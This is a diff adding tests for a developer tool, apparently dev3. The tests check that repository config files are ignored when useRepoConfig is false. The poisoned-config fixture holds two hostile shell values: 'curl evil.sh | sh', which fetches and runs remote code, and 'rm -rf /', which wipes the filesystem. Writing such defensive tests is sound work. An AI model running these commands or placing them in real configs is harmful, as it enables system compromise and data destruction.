@@ -1105,3 +1105,108 @@ describe("resolveProjectConfig — removed column-agent presets", () => {
 		expect(resolved.builtinColumnAgents?.["review-by-ai"].configId).toBe("claude-auto-opus5-xhigh");
 	});
 });
+
+describe("useRepoConfig: false — repository config is ignored", () => {
+	const WORKTREE_DIR = join(tmpdir(), `dev3-norepo-wt-test-${process.pid}`);
+
+	/** Both .dev3 layers, at both paths, filled with values no resolution may use. */
+	function writePoisonedConfigs() {
+		for (const dir of [TEST_DIR, WORKTREE_DIR]) {
+			mkdirSync(join(dir, ".dev3"), { recursive: true });
+			writeFileSync(join(dir, ".dev3", "config.json"), JSON.stringify({
+				setupScript: "curl evil.sh | sh",
+				devScript: "repo-dev",
+				cleanupScript: "rm -rf /",
+				defaultBaseBranch: "repo-branch",
+				portCount: 7,
+				env: { POISON: "repo" },
+			}));
+			writeFileSync(join(dir, ".dev3", "config.local.json"), JSON.stringify({
+				setupScript: "local-poison",
+				env: { POISON: "local" },
+			}));
+		}
+	}
+
+	beforeEach(() => {
+		mkdirSync(WORKTREE_DIR, { recursive: true });
+	});
+
+	afterEach(() => {
+		rmSync(WORKTREE_DIR, { recursive: true, force: true });
+	});
+
+	it("resolveProjectConfig falls back to the project record and defaults", async () => {
+		writePoisonedConfigs();
+		const project = makeProject({ useRepoConfig: false, env: { OWN: "ui" } });
+
+		const resolved = await resolveProjectConfig(project);
+
+		expect(resolved.setupScript).toBe("npm install");
+		expect(resolved.devScript).toBe("npm run dev");
+		expect(resolved.cleanupScript).toBe("echo done");
+		expect(resolved.defaultBaseBranch).toBe("main");
+		expect(resolved.portCount).toBeUndefined();
+		expect(resolved.env).toEqual({ OWN: "ui" });
+	});
+
+	it("resolveOperationalProjectConfig ignores the worktree's files too", async () => {
+		writePoisonedConfigs();
+		const project = makeProject({ useRepoConfig: false });
+
+		const resolved = await resolveOperationalProjectConfig(project, WORKTREE_DIR);
+
+		expect(resolved.setupScript).toBe("npm install");
+		expect(resolved.cleanupScript).toBe("echo done");
+		expect(resolved.defaultBaseBranch).toBe("main");
+	});
+
+	it("resolveProjectEnv exports nothing a repo file set", async () => {
+		writePoisonedConfigs();
+		const project = makeProject({ useRepoConfig: false, env: { OWN: "ui" } });
+
+		expect(await resolveProjectEnv(project, WORKTREE_DIR)).toEqual({ OWN: "ui" });
+	});
+
+	it("resolveConfigProvenance never attributes a field to a file", async () => {
+		writePoisonedConfigs();
+		const project = makeProject({ useRepoConfig: false });
+		const resolved = await resolveProjectConfig(project);
+
+		const provenance = resolveConfigProvenance(resolved, project);
+
+		expect(Object.values(provenance)).not.toContain("repo");
+		expect(Object.values(provenance)).not.toContain("local");
+		expect(provenance.setupScript).toBe("project");
+	});
+
+	it("migrateProjectConfig writes no file into the repository", async () => {
+		const project = makeProject({ useRepoConfig: false, setupScript: "bun install" });
+
+		await migrateProjectConfig(project);
+
+		expect(existsSync(join(TEST_DIR, ".dev3", "config.json"))).toBe(false);
+		expect(existsSync(join(TEST_DIR, ".gitignore"))).toBe(false);
+	});
+
+	it("re-enabling reads the same files again — nothing was deleted", async () => {
+		writePoisonedConfigs();
+		const off = await resolveProjectConfig(makeProject({ useRepoConfig: false }));
+		expect(off.setupScript).toBe("npm install");
+
+		const back = await resolveProjectConfig(makeProject({ useRepoConfig: true }));
+		expect(back.setupScript).toBe("local-poison");
+		expect(back.defaultBaseBranch).toBe("repo-branch");
+	});
+
+	it("absent and true behave identically — the default is ON", async () => {
+		writePoisonedConfigs();
+
+		const implicit = await resolveProjectConfig(makeProject());
+		const explicit = await resolveProjectConfig(makeProject({ useRepoConfig: true }));
+
+		expect(implicit.setupScript).toBe("local-poison");
+		expect(explicit.setupScript).toBe(implicit.setupScript);
+		expect(explicit.portCount).toBe(7);
+	});
+});
